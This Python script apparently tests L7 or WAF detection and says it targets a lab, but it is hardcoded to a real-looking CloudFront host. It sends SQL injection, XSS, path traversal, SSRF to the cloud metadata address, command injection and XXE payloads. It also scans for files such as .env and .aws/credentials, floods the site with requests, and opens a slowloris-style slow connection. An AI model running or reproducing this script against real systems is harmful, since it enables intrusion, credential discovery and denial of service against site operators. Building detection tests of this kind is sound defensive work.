#!/usr/bin/env python3
"""
L7 Event Testing Script - Controlled Lab Environment
All tests conducted against lab infrastructure only. No customer data used.
"""
import requests
import time
import string
import random
from datetime import datetime
from threading import Thread
from itertools import cycle

base_url = "https://dnh9gohi236m8.cloudfront.net"
duration = 300
interval = 0.5

# --- User Agents ---
user_agents = [
    "Shay-scraper-Bot/1.0",
    "Shay-scraper-Bot/2.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "sqlmap/1.5",
    "nikto/2.1.6",
    "python-requests/2.28.0",
    "",  # empty UA
    "a" * 5000,  # oversized UA
]

# --- Paths (scanning, traversal, sensitive files) ---
paths = [
    "/", "/admin", "/wp-admin", "/login", "/api", "/robots.txt",
    "/sitemap.xml", "/.env", "/config", "/backup",
    "/../../etc/passwd",  # path traversal
    "/.git/config",
    "/wp-login.php",
    "/phpmyadmin",
    "/server-status",
    "/.aws/credentials",
    "/api/v1/users",
    "/graphql",
    "/actuator/health",
    "/debug/vars",
]

# --- HTTP Methods ---
methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]

# --- Query String Attacks ---
malicious_queries = [
    "?id=1' OR '1'='1",  # SQL injection
    "?q=<script>alert(1)</script>",  # XSS
    "?file=../../../../etc/passwd",  # LFI
    "?url=http://169.254.169.254/latest/meta-data/",  # SSRF
    "?cmd=;cat /etc/passwd",  # command injection
    "?redirect=http://evil.com",  # open redirect
    "?" + "A" * 8000,  # oversized query string
    "?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",  # XXE
]

# --- Headers for various L7 signals ---
malicious_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": ", ".join([f"10.0.0.{i}" for i in range(50)])},  # header stuffing
    {"Referer": "http://evil-phishing-site.com/steal"},
    {"Cookie": "session=" + "A" * 5000},  # oversized cookie
    {"Content-Type": "application/xml"},
    {"Authorization": "Bearer " + "x" * 2000},
    {"Host": "evil.com"},  # host header injection
    {"Transfer-Encoding": "chunked"},
]

# --- POST Bodies ---
post_payloads = [
    "<script>alert('xss')</script>",
    "' OR 1=1 --",
    '{"__proto__":{"admin":true}}',  # prototype pollution
    "A" * 100000,  # large body
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '{"username":"admin","password":"admin"}',
]


def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


def test_rate_flood():
    """High-rate requests to trigger rate-based rules."""
    log("=== RATE FLOOD TEST ===")
    for i in range(200):
        try:
            r = requests.get(base_url + "/", headers={"User-Agent": "flood-bot"}, timeout=5)
            if i % 50 == 0:
                log(f"  Flood request #{i} -> {r.status_code}")
        except Exception as e:
            log(f"  Flood #{i} ERROR: {e}")
        time.sleep(0.05)


def test_methods():
    """Test various HTTP methods."""
    log("=== HTTP METHOD TEST ===")
    for method in methods:
        try:
            r = requests.request(method, base_url + "/", headers={"User-Agent": "method-tester"}, timeout=5)
            log(f"  {method} / -> {r.status_code}")
        except Exception as e:
            log(f"  {method} / -> ERROR: {e}")
        time.sleep(interval)


def test_sqli_xss():
    """SQL injection and XSS via query strings."""
    log("=== SQLi/XSS QUERY TEST ===")
    for q in malicious_queries:
        try:
            r = requests.get(base_url + "/" + q, headers={"User-Agent": "injection-tester"}, timeout=5)
            log(f"  {q[:60]} -> {r.status_code}")
        except Exception as e:
            log(f"  {q[:60]} -> ERROR: {e}")
        time.sleep(interval)


def test_post_payloads():
    """Malicious POST bodies."""
    log("=== POST PAYLOAD TEST ===")
    for payload in post_payloads:
        try:
            r = requests.post(base_url + "/api", data=payload, headers={"User-Agent": "post-tester"}, timeout=5)
            log(f"  payload[:{min(40,len(payload))}] -> {r.status_code}")
        except Exception as e:
            log(f"  POST ERROR: {e}")
        time.sleep(interval)


def test_header_abuse():
    """Malicious/abnormal headers."""
    log("=== HEADER ABUSE TEST ===")
    for hdrs in malicious_headers:
        try:
            merged = {"User-Agent": "header-tester", **hdrs}
            r = requests.get(base_url + "/", headers=merged, timeout=5)
            key = list(hdrs.keys())[0]
            log(f"  {key}: {str(list(hdrs.values())[0])[:50]} -> {r.status_code}")
        except Exception as e:
            log(f"  Header ERROR: {e}")
        time.sleep(interval)


def test_path_traversal_and_scanning():
    """Path traversal and sensitive path scanning."""
    log("=== PATH SCAN TEST ===")
    for path in paths:
        try:
            r = requests.get(base_url + path, headers={"User-Agent": "path-scanner"}, timeout=5)
            log(f"  {path} -> {r.status_code}")
        except Exception as e:
            log(f"  {path} -> ERROR: {e}")
        time.sleep(interval)


def test_slowloris():
    """Slow read / incomplete request simulation."""
    log("=== SLOW REQUEST TEST ===")
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("dnh9gohi236m8.cloudfront.net", 443))
        import ssl
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname="dnh9gohi236m8.cloudfront.net")
        s.send(b"GET / HTTP/1.1\r\nHost: dnh9gohi236m8.cloudfront.net\r\n")
        # Send headers slowly
        for i in range(10):
            s.send(f"X-Slow-{i}: {'A'*100}\r\n".encode())
            time.sleep(2)
        s.send(b"\r\n")
        resp = s.recv(1024)
        log(f"  Slow response: {resp[:80]}")
        s.close()
    except Exception as e:
        log(f"  Slowloris ERROR: {e}")


def scraper_worker(user_agent):
    """Original scraper simulation with rotating paths."""
    end_time = time.time() + duration
    request_count = 0
    path_cycle = cycle(paths)

    while time.time() < end_time:
        request_count += 1
        path = next(path_cycle)
        url = base_url + path
        try:
            start = time.time()
            r = requests.get(url, headers={"User-Agent": user_agent}, timeout=5)
            elapsed = time.time() - start
            if request_count % 20 == 0:
                log(f"  {user_agent[:30]} #{request_count}: {path} -> {r.status_code} ({elapsed:.2f}s)")
        except Exception as e:
            log(f"  {user_agent[:30]} #{request_count}: ERROR - {e}")
        time.sleep(interval)

    log(f"  {user_agent[:30]} completed {request_count} requests")


if __name__ == "__main__":
    print("=" * 60)
    print("L7 EVENT TEST - CONTROLLED LAB ENVIRONMENT")
    print("No customer data or details used.")
    print(f"Target: {base_url}")
    print(f"Duration: {duration}s")
    print("=" * 60 + "\n")

    # Run targeted tests first
    test_methods()
    test_sqli_xss()
    test_post_payloads()
    test_header_abuse()
    test_path_traversal_and_scanning()
    test_rate_flood()
    test_slowloris()

    # Then run sustained scraper simulation
    log("\n=== SUSTAINED SCRAPER SIMULATION ===")
    threads = [Thread(target=scraper_worker, args=(ua,)) for ua in user_agents]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print("\n" + "=" * 60)
    print("ALL L7 TESTS COMPLETED")
    print("=" * 60)
